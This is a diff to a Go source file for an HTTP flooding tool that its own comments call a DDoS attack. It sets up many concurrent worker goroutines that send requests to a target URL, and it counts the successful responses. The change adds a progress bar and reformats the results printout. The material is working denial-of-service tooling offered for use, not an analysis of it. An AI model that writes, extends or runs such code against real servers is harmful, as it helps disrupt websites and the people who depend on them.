@@ -10,6 +10,8 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+
+	"github.com/cheggaaa/pb/v3"
 )
 
 // DDoS - structure of value for DDoS attack
@@ -25,6 +27,7 @@ type DDoS struct {
 	successRequest    int64
 	amountRequests    int64
 	successRequest200 int64
+	bar               *pb.ProgressBar
 }
 
 // New - initialization of new DDoS attack
@@ -37,6 +40,7 @@ func New(URL string, workers int, method, body string, origins []string) (*DDoS,
 		return nil, fmt.Errorf("undefined host or error = %v", err)
 	}
 	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
+	bar := pb.StartNew(workers)
 	return &DDoS{
 		url:               URL,
 		amountWorkers:     workers,
@@ -47,10 +51,12 @@ func New(URL string, workers int, method, body string, origins []string) (*DDoS,
 		successRequest200: 0,
 		origins:           origins,
 		randGen:           randGen,
+		bar:               bar,
 	}, nil
 }
 func fetchURL(wg *sync.WaitGroup, d *DDoS) ([]byte, error) {
 	defer wg.Done()
+	defer d.bar.Increment()
 	var req *http.Request
 	var err error
 
@@ -89,16 +95,29 @@ func fetchURL(wg *sync.WaitGroup, d *DDoS) ([]byte, error) {
 // Run - run DDoS attack
 func (d *DDoS) Run() {
 	var wg sync.WaitGroup
-
+	fmt.Printf("\nProcess...\n")
 	for i := 0; i < d.amountWorkers; i++ {
 		wg.Add(1)
 		go fetchURL(&wg, d)
 	}
 	wg.Wait()
+	d.bar.Finish()
+	fmt.Printf("\n\n")
 }
 
 // Result - result of DDoS attack
 func (d DDoS) Result() (successRequest, amountRequests int64) {
-	fmt.Printf("\n===============\nsuccessRequest :{%v} \namountRequests :{%v}\nsuccessRequest200 :{%d}", d.successRequest, d.amountRequests, d.successRequest200)
+	fmt.Printf(`
+=============Result=============================
+	 successRequest    : {%v}
+	 amountRequests    : {%v}
+	 successRequest200 : {%v}
+	 Method            : {%v}
+	 Url:
+	 [%v]
+=================================================
+
+`, d.successRequest, d.amountRequests, d.successRequest200, d.method, d.url)
+
 	return d.successRequest, d.amountRequests
 }
